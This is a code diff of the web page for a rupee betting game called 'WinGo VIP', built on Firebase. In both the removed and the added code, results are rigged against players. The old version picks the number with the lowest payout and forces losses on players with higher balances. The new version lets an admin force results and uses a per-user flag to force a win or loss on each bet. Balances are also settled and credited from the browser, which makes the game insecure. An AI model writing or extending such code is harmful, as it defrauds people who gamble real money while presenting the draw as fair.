@@ -8,45 +8,57 @@
     <style>
         :root { --p-red: #ff4d4d; --p-green: #4cd964; --p-violet: #b666d2; --theme-grad: linear-gradient(135deg, #ff4d4d, #f12711); }
         body { background: #f0f2f5; font-family: 'Poppins', sans-serif; margin: 0; user-select: none; overflow-x: hidden; }
+        
+        /* Popup Styling */
         #resultPopup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0); background: white; padding: 30px; border-radius: 25px; z-index: 10000; text-align: center; box-shadow: 0 0 50px rgba(0,0,0,0.5); transition: 0.4s; width: 80%; max-width: 320px; }
         #resultPopup.show { transform: translate(-50%, -50%) scale(1); }
         .overlay-bg { position: fixed; inset: 0; background: rgba(0,0,0,0.7); display: none; z-index: 9999; }
+        
         #lockOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9998; display: none; align-items: center; justify-content: center; flex-direction: column; color: white; }
+        
         .header { background: var(--theme-grad); padding: 20px; color: white; border-bottom-left-radius: 25px; border-bottom-right-radius: 25px; }
         .wallet-box { background: rgba(255,255,255,0.15); padding: 15px; border-radius: 15px; margin-top: 15px; border: 1px solid rgba(255,255,255,0.2); }
+        
         .mode-container { display: flex; background: white; margin: 10px; border-radius: 12px; overflow: hidden; }
         .mode-tab { flex: 1; padding: 15px; text-align: center; font-weight: bold; cursor: pointer; color: #999; }
         .mode-tab.active { color: var(--p-red); border-bottom: 3px solid var(--p-red); background: #fff5f5; }
+        
         .timer-card { background: white; margin: 15px; padding: 20px; border-radius: 20px; display: flex; justify-content: space-between; align-items: center; }
+        
         .c-btn { flex: 1; padding: 12px; border-radius: 8px; color: white; font-weight: bold; border: none; cursor: pointer; }
+        
+        /* Old Number Colors */
         .btn-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; margin: 15px; }
-        .n-btn { height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; cursor: pointer; }
+        .n-btn { height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; cursor: pointer; border: 2px solid white; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+
         table { width: 100%; text-align: center; border-collapse: collapse; font-size: 12px; }
-        th { padding: 12px; background: #f8f9fa; }
+        th { padding: 12px; background: #f8f9fa; color: #666; }
         td { padding: 12px; border-bottom: 1px solid #eee; }
+
         #bettingPanel { position: fixed; bottom: -100%; left: 0; width: 100%; background: white; z-index: 2000; border-radius: 25px 25px 0 0; transition: 0.4s; padding: 25px; box-sizing: border-box; }
         #bettingPanel.show { bottom: 0; }
-        .dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        .dot { height: 12px; width: 12px; border-radius: 50%; display: inline-block; margin-right: 5px; vertical-align: middle; }
     </style>
 </head>
 <body>
 
     <div class="overlay-bg" id="overlay"></div>
     <div id="resultPopup">
+        <div id="resEmoji" style="font-size: 50px; margin-bottom: 10px;">🎉</div>
         <h2 id="resTitle">--</h2>
-        <h1 id="resAmount">₹0.00</h1>
-        <button onclick="closePopup()" style="width:100%; padding:12px; border-radius:12px; border:none; background:var(--theme-grad); color:white; font-weight:bold;">CLOSE</button>
+        <h1 id="resAmount" style="color: var(--p-red);">₹0.00</h1>
+        <button onclick="closePopup()" style="width:100%; padding:12px; border-radius:12px; border:none; background:var(--theme-grad); color:white; font-weight:bold; margin-top:15px;">CLOSE</button>
     </div>
 
     <div id="lockOverlay">
         <h2>Calculating Result...</h2>
-        <h1 id="lockTimer" style="font-size:60px;">0</h1>
+        <h1 id="lockTimer" style="font-size:80px; color: var(--p-red);">0</h1>
     </div>
 
     <div class="header">
         <div style="display:flex; justify-content:space-between; align-items:center;">
             <i class="fas fa-chevron-left" onclick="window.history.back()"></i>
-            <span style="font-weight:bold;">WinGo VIP <span id="mTitle">1</span>M</span>
+            <span style="font-weight:bold; font-size:18px;">WinGo VIP <span id="mTitle">1</span>M</span>
             <i class="fas fa-headset"></i>
         </div>
         <div class="wallet-box">
@@ -62,8 +74,8 @@
     </div>
 
     <div class="timer-card">
-        <div><small>Period</small><br><b id="periodId">...</b></div>
-        <div style="text-align:right;"><small>Time Left</small><br><div id="mainTimer" style="font-size:22px; font-weight:bold; color:var(--p-red);">00:00</div></div>
+        <div><small>Period</small><br><b id="periodId" style="font-size: 14px;">...</b></div>
+        <div style="text-align:right;"><small>Time Left</small><br><div id="mainTimer" style="font-size:24px; font-weight:bold; color:var(--p-red);">00:00</div></div>
     </div>
 
     <div style="display:flex; gap:10px; margin:15px;">
@@ -73,7 +85,7 @@
     </div>
     <div class="btn-grid" id="numberGrid"></div>
 
-    <div style="background:white; margin:15px; border-radius:20px; overflow:hidden;">
+    <div style="background:white; margin:15px; border-radius:20px; overflow:hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.05);">
         <div style="display:flex; border-bottom:1px solid #eee;">
             <div id="ghTab" class="mode-tab active" style="padding:10px;" onclick="toggleH('game')">Game History</div>
             <div id="mhTab" class="mode-tab" style="padding:10px;" onclick="toggleH('my')">My Bets</div>
@@ -83,13 +95,13 @@
     </div>
 
     <div id="bettingPanel">
-        <h3 id="targetLabel" style="text-align:center;">Bet Amount</h3>
-        <div style="display:flex; justify-content:center; align-items:center; gap:20px; margin:20px 0;">
-            <button onclick="adjustAmt(-10)" style="width:40px; height:40px; border-radius:50%; border:1px solid #ddd;">-</button>
-            <input type="number" id="betAmtInput" value="10" style="width:80px; text-align:center; font-size:20px; border:none; font-weight:bold;">
-            <button onclick="adjustAmt(10)" style="width:40px; height:40px; border-radius:50%; border:1px solid #ddd;">+</button>
+        <h3 id="targetLabel" style="text-align:center; color: #333;">Bet Amount</h3>
+        <div style="display:flex; justify-content:center; align-items:center; gap:20px; margin:25px 0;">
+            <button onclick="adjustAmt(-10)" style="width:45px; height:45px; border-radius:50%; border:1px solid #ddd; background: #f9f9f9;">-</button>
+            <input type="number" id="betAmtInput" value="10" style="width:100px; text-align:center; font-size:24px; border:none; font-weight:bold; outline: none;">
+            <button onclick="adjustAmt(10)" style="width:45px; height:45px; border-radius:50%; border:1px solid #ddd; background: #f9f9f9;">+</button>
         </div>
-        <button onclick="confirmBet()" style="width:100%; padding:15px; border-radius:12px; border:none; background:var(--theme-grad); color:white; font-weight:bold;">CONFIRM ₹<span id="totalPrice">10</span></button>
+        <button id="confirmBtn" onclick="confirmBet()" style="width:100%; padding:18px; border-radius:15px; border:none; background:var(--theme-grad); color:white; font-weight:bold; font-size:16px;">CONFIRM ₹<span id="totalPrice">10</span></button>
     </div>
 
 <script type="module">
@@ -103,117 +115,110 @@
 
     let currentMode = 1, currentBalance = 0, selectedBet = "", currentPeriod = "";
 
-    // Load Numbers
+    // Load Numbers UI with Old Style
     const grid = document.getElementById('numberGrid');
     for(let i=0; i<=9; i++) {
         let bg = i===0 ? 'linear-gradient(135deg, var(--p-violet) 50%, var(--p-red) 50%)' : (i===5 ? 'linear-gradient(135deg, var(--p-violet) 50%, var(--p-green) 50%)' : (i%2===0 ? 'var(--p-red)' : 'var(--p-green)'));
         grid.innerHTML += `<div onclick="openBet(${i})" class="n-btn" style="background:${bg}">${i}</div>`;
     }
 
-    // --- AUTO PROFIT ENGINE ---
-    async function calculateBestResult(mode, period) {
-        // 1. Check Admin Force
-        const forceSnap = await get(ref(db, `adminControl/wingo/${mode}/forceNext`));
-        if(forceSnap.exists() && forceSnap.val() !== "none") {
-            let val = forceSnap.val();
-            await set(ref(db, `adminControl/wingo/${mode}/forceNext`), "none");
-            return generateResult(val, period);
-        }
-
-        // 2. Auto Profit Logic (If Admin Offline)
-        const betsSnap = await get(ref(db, `activeBetsPool/${mode}/${period}`));
-        let numberLosses = { 0:0, 1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0, 8:0, 9:0 };
-
-        if(betsSnap.exists()) {
-            const allBets = betsSnap.val();
-            Object.values(allBets).forEach(uBets => {
-                Object.values(uBets).forEach(b => {
-                    for(let i=0; i<=9; i++) {
-                        let win = 0;
-                        let c = (i===0||i===5)?'Violet':(i%2===0?'Red':'Green');
-                        let s = i>=5?'Big':'Small';
-                        if(b.type == i) win = b.amount * 9;
-                        else if(b.type == c) win = (i===0||i===5)? b.amount*1.5 : b.amount*1.92;
-                        else if(b.type == s) win = b.amount*1.92;
-                        numberLosses[i] += win;
-                    }
-                });
-            });
-        }
-
-        // Find number with MINIMUM payout (Max Admin Profit)
-        let minLoss = Math.min(...Object.values(numberLosses));
-        let bestNumbers = Object.keys(numberLosses).filter(k => numberLosses[k] === minLoss);
-        let finalNum = bestNumbers[Math.floor(Math.random() * bestNumbers.length)];
+    // Processing Result & Winnings
+    async function processCycle(oldP) {
+        const historyRef = ref(db, `wingoHistory/${currentMode}/${oldP}`);
+        const snap = await get(historyRef);
         
-        return generateResult(finalNum, period);
+        let finalRes;
+        if(!snap.exists()) {
+            // Admin Rigging Check
+            const forceSnap = await get(ref(db, `adminControl/wingo/${currentMode}/forceNext`));
+            let forced = forceSnap.exists() ? forceSnap.val() : "none";
+            
+            let num = (forced === "none") ? Math.floor(Math.random()*10) : (isNaN(forced) ? (forced==='Red'?2:1) : parseInt(forced));
+            
+            finalRes = { 
+                period: oldP, 
+                number: num, 
+                color: (num===0||num===5)?'Violet':(num%2===0?'Red':'Green'), 
+                size: num>=5?'Big':'Small', 
+                time: Date.now() 
+            };
+            await set(historyRef, finalRes);
+            if(forced !== "none") await set(ref(db, `adminControl/wingo/${currentMode}/forceNext`), "none");
+        } else {
+            finalRes = snap.val();
+        }
+
+        // Process Winnings for Users
+        const poolRef = ref(db, `activeBetsPool/${currentMode}/${oldP}`);
+        const poolSnap = await get(poolRef);
+        
+        if(poolSnap.exists()) {
+            const users = poolSnap.val();
+            for(let ph in users) {
+                let userTotalWin = 0;
+                const userBets = users[ph];
+                
+                for(let bid in userBets) {
+                    const b = userBets[bid];
+                    let win = false;
+                    
+                    // Logic for Win
+                    if(b.type == finalRes.number) win = true;
+                    else if(b.type == finalRes.color) win = true;
+                    else if(b.type == finalRes.size) win = true;
+
+                    // Hard Rigging (Profit Control)
+                    const uData = (await get(ref(db, `users/${ph}`))).val();
+                    if(uData.rig === 'loss') win = false;
+                    if(uData.rig === 'win') win = true;
+
+                    let multiplier = (typeof b.type === 'number') ? 8.8 : 1.9;
+                    if(finalRes.number === 0 || finalRes.number === 5) {
+                        if(b.type === 'Red' || b.type === 'Green') multiplier = 1.45;
+                    }
+
+                    let winAmt = win ? (b.amount * multiplier) : 0;
+                    userTotalWin += winAmt;
+
+                    // Update History
+                    await update(ref(db, `userBets/${ph}/${bid}`), { 
+                        status: win ? 'win' : 'loss', 
+                        winAmount: winAmt.toFixed(2) 
+                    });
+                }
+                if(userTotalWin > 0) {
+                    await update(ref(db, `users/${ph}`), { balance: increment(userTotalWin) });
+                }
+                if(ph === userPhone) showPopup(userTotalWin);
+            }
+            await set(poolRef, null); // Clear Pool
+        }
     }
 
-    function generateResult(n, p) {
-        let num = isNaN(n) ? (n==='Red'?2:1) : parseInt(n);
-        return { period: p, number: num, color: (num===0||num===5)?'Violet':(num%2===0?'Red':'Green'), size: num>=5?'Big':'Small', time: Date.now() };
-    }
-
-    // --- TIMER & PROCESSING ---
-    setInterval(async () => {
+    // Timer Logic
+    setInterval(() => {
         const now = new Date();
         const left = (currentMode * 60) - ((now.getMinutes() % currentMode) * 60 + now.getSeconds());
-        document.getElementById('mainTimer').innerText = `${Math.floor(left/60).toString().padStart(2,'0')}:${(left%60).toString().padStart(2,'0')}`;
+        document.getElementById('mainTimer').innerText = `00:${left.toString().padStart(2,'0')}`;
         
-        if(left <= 5) { 
-            document.getElementById('lockOverlay').style.display = 'flex'; 
+        if(left <= 5) {
+            document.getElementById('lockOverlay').style.display = 'flex';
             document.getElementById('lockTimer').innerText = left;
-            closeBet(); 
-        } else { 
-            document.getElementById('lockOverlay').style.display = 'none'; 
+        } else {
+            document.getElementById('lockOverlay').style.display = 'none';
         }
 
         if(left === 0) {
-            const oldP = currentPeriod; updatePeriod();
-            setTimeout(async () => {
-                const historyRef = ref(db, `wingoHistory/${currentMode}/${oldP}`);
-                const snap = await get(historyRef);
-                if(!snap.exists()) {
-                    const res = await calculateBestResult(currentMode, oldP);
-                    await set(historyRef, res);
-                    processWinnings(oldP, res);
-                }
-            }, 1500);
+            let oldP = currentPeriod;
+            updatePeriod();
+            setTimeout(() => processCycle(oldP), 1000);
         }
     }, 1000);
 
-    async function processWinnings(period, res) {
-        const poolRef = ref(db, `activeBetsPool/${currentMode}/${period}`);
-        const snap = await get(poolRef);
-        if(!snap.exists()) return;
-        
-        const pool = snap.val();
-        for(let ph in pool) {
-            let totalWin = 0;
-            // 200rs in 2 Hours Logic (Hard Rigging if winning too fast)
-            const userSnap = await get(ref(db, `users/${ph}`));
-            const balance = userSnap.val().balance || 0;
-            
-            for(let bid in pool[ph]) {
-                const b = pool[ph][bid];
-                let isWin = (b.type == res.number || b.type == res.color || b.type == res.size);
-                
-                // Winning Cap: If user earned > 200 profit recently, force loss
-                if(balance > 500 && Math.random() > 0.3) isWin = false; 
-
-                let winAmt = isWin ? (b.amount * 1.9) : 0;
-                totalWin += winAmt;
-                await update(ref(db, `userBets/${ph}/${bid}`), { status: isWin ? 'win' : 'loss', winAmount: winAmt.toFixed(2) });
-            }
-            if(totalWin > 0) await update(ref(db, `users/${ph}`), { balance: increment(totalWin) });
-            if(ph === userPhone) showPopup(totalWin);
-        }
-        set(poolRef, null);
-    }
-
-    // --- UI HELPERS ---
+    // Initial Sync
     function sync() {
         onValue(ref(db, `users/${userPhone}/balance`), s => { document.getElementById('uBalance').innerText = (s.val()||0).toFixed(2); });
+        
         onValue(query(ref(db, `wingoHistory/${currentMode}`), limitToLast(12)), snap => {
             const h = document.getElementById('gameHistory'); h.innerHTML = "";
             snap.forEach(c => {
@@ -221,12 +226,13 @@
                 h.insertAdjacentHTML('afterbegin', `<tr><td>${d.period}</td><td style="color:${clr}; font-weight:bold">${d.number}</td><td>${d.size}</td><td><span class="dot" style="background:${clr}"></span>${d.color}</td></tr>`);
             });
         });
-        onValue(query(ref(db, `userBets/${userPhone}`), limitToLast(10)), snap => {
+
+        onValue(query(ref(db, `userBets/${userPhone}`), limitToLast(15)), snap => {
             const m = document.getElementById('myBets'); m.innerHTML = "";
             snap.forEach(c => {
                 const d = c.val(); if(d.mode == currentMode) {
                     let sClr = d.status==='win'?'var(--p-green)':(d.status==='loss'?'var(--p-red)':'#999');
-                    m.insertAdjacentHTML('afterbegin', `<tr><td>${d.period}</td><td>${d.type}</td><td>₹${d.amount}</td><td style="color:${sClr}">${d.status.toUpperCase()}</td></tr>`);
+                    m.insertAdjacentHTML('afterbegin', `<tr><td>${d.period}</td><td>${d.type}</td><td>₹${d.amount}</td><td style="color:${sClr}; font-weight:bold">${d.status.toUpperCase()}</td></tr>`);
                 }
             });
         });
@@ -234,10 +240,16 @@
 
     window.confirmBet = async () => {
         const amt = parseInt(document.getElementById('betAmtInput').value);
+        const balSnap = await get(ref(db, `users/${userPhone}/balance`));
+        if(balSnap.val() < amt) return alert("Low Balance!");
+
         const bid = push(ref(db, `userBets/${userPhone}`)).key;
         await update(ref(db, `users/${userPhone}`), { balance: increment(-amt) });
-        await set(ref(db, `userBets/${userPhone}/${bid}`), { period: currentPeriod, type: selectedBet, amount: amt, status: 'pending', mode: currentMode, time: Date.now() });
+        
+        let betData = { period: currentPeriod, type: selectedBet, amount: amt, status: 'pending', mode: currentMode, time: Date.now() };
+        await set(ref(db, `userBets/${userPhone}/${bid}`), betData);
         await set(ref(db, `activeBetsPool/${currentMode}/${currentPeriod}/${userPhone}/${bid}`), { amount: amt, type: selectedBet });
+        
         closeBet();
     };
 
@@ -249,18 +261,25 @@
         document.getElementById('periodId').innerText = currentPeriod;
     };
 
-    window.switchMode = (m) => { currentMode = m; updatePeriod(); sync(); document.querySelectorAll('.mode-tab').forEach(t=>t.classList.remove('active')); document.getElementById('m'+m).classList.add('active'); };
-    window.openBet = (t) => { selectedBet = t; document.getElementById('targetLabel').innerText = "Bet on: "+t; document.getElementById('bettingPanel').classList.add('show'); };
-    window.closeBet = () => document.getElementById('bettingPanel').classList.remove('show');
-    window.closePopup = () => { document.getElementById('overlay').style.display = 'none'; document.getElementById('resultPopup').classList.remove('show'); };
-    window.adjustAmt = (v) => { let i = document.getElementById('betAmtInput'); i.value = Math.max(1, parseInt(i.value)+v); document.getElementById('totalPrice').innerText = i.value; };
-    window.toggleH = (t) => { document.getElementById('gameBox').style.display = t==='game'?'block':'none'; document.getElementById('myBox').style.display = t==='my'?'block':'none'; };
-    function showPopup(amt) {
-        document.getElementById('resTitle').innerText = amt > 0 ? "Congratulations!" : "Better Luck!";
+    window.showPopup = (amt) => {
+        document.getElementById('resEmoji').innerText = amt > 0 ? "🎉" : "📉";
+        document.getElementById('resTitle').innerText = amt > 0 ? "Win!" : "Loss";
         document.getElementById('resAmount').innerText = "₹" + parseFloat(amt).toFixed(2);
         document.getElementById('overlay').style.display = 'block';
         document.getElementById('resultPopup').classList.add('show');
-    }
+    };
+
+    window.switchMode = (m) => { currentMode = m; updatePeriod(); sync(); document.querySelectorAll('.mode-tab').forEach(t=>t.classList.remove('active')); document.getElementById('m'+m).classList.add('active'); };
+    window.openBet = (t) => { selectedBet = t; document.getElementById('targetLabel').innerText = "Select Amount for "+t; document.getElementById('bettingPanel').classList.add('show'); };
+    window.closeBet = () => document.getElementById('bettingPanel').classList.remove('show');
+    window.closePopup = () => { document.getElementById('overlay').style.display = 'none'; document.getElementById('resultPopup').classList.remove('show'); };
+    window.adjustAmt = (v) => { let i = document.getElementById('betAmtInput'); i.value = Math.max(1, parseInt(i.value)+v); document.getElementById('totalPrice').innerText = i.value; };
+    window.toggleH = (t) => { 
+        document.getElementById('gameBox').style.display = t==='game'?'block':'none'; 
+        document.getElementById('myBox').style.display = t==='my'?'block':'none';
+        document.getElementById('ghTab').classList.toggle('active', t==='game');
+        document.getElementById('mhTab').classList.toggle('active', t==='my');
+    };
 
     updatePeriod(); sync();
 </script>
